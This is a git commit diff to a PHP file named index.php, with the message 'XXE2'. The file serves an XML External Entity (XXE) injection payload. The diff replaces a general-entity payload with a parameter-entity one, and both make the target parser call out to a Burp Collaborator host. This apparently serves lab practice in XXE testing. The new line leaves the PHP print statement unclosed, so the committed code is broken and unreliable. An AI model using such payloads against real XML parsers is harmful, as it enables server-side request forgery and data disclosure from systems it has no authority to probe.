e13d9a2362d68442ab2322def769bad85ef186f6
dinar92 <gdinar92@gmail.com>
2021-05-26 08:11:31 +0300

    XXE2

--- index.php
+++ index.php
@@ -2,10 +2,6 @@
 <?php
 
 print("<?xml version=\"1.0\" ?>
-<!DOCTYPE r [
-<!ELEMENT r ANY >
-<!ENTITY sp SYSTEM \"http://xxeBot.v0wxs79x4klpfklh54f3wx8fl6r4ft.burpcollaborator.net\">
-]>
-<r>&sp;</r>");
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM \"http://xxeBot.v0wxs79x4klpfklh54f3wx8fl6r4ft.burpcollaborator.net\"> %xxe; ]> 
 
 ?>
